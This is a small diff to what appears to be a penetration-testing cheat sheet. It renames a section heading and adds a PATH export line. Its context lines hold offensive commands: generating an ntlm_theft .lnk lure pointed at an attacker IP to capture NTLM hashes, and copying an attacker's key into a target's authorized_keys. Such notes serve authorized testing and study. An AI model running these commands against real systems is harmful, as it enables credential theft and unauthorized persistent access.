@@ -229,7 +229,8 @@ python3 ntlm_theft.py -g lnk -s <ip> -f vault
 scp -O -i id_rsa authorized_keys max@$IP:/home/max/.ssh/authorized_keys
 ```
 ---
-# ident 
+# FreeBSD 
 ```bash
 ./ident-user-enum.pl 10.0.0.1 21 80 113 443
+export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
 ```
